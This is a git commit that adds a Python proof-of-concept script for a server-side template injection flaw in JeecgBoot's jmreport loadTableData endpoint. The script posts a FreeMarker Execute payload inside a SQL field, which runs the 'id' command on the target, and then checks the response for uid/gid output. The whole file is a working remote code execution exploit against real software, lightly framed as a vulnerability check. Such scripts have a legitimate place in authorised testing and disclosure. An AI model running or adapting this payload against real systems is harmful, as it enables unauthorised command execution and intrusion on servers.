7f7c447746f552f414eb1d5367b17e4d0a7ee2aa
myh0st <1293348082@qq.com>
2024-12-27 16:31:42 +0800

    Create jeecgboot-jmreport-loadTableData-ssti.py

---
+++ jeecgboot-jmreport-loadTableData-ssti.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+#author: myh0st@xazlsec
+
+import sys
+import requests
+import re
+import urllib
+import urllib3
+
+urllib3.disable_warnings()
+
+def verify(site):
+    burp0_url = site + "/jeecg-boot/jmreport/loadTableData"
+    burp0_headers = {"User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95", "Connection": "close", "Content-Type": "application/json;charset=UTF-8", "Accept-Encoding": "gzip"}
+    burp0_json={"dbSource": "", "pageNo": 1, "pageSize": 10, "sql": "select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"id\")}'", "tableName": "test_demo);"}
+    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
+    info = r.json()["result"]["records"]
+    if "uid=" in str(info) and "gid=" in str(info):
+        return str(info)
+    return ""
+    
+if __name__=="__main__":
+    target = sys.argv[1]
+    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 jeecgboot-jmreport-loadTableData-ssti.py ",target)
+    data = verify(target)
+    if data:
+        print("[+]漏洞存在，执行命令 id 的结果为：", data)
+    else:
+        print("[-]漏洞不存在")
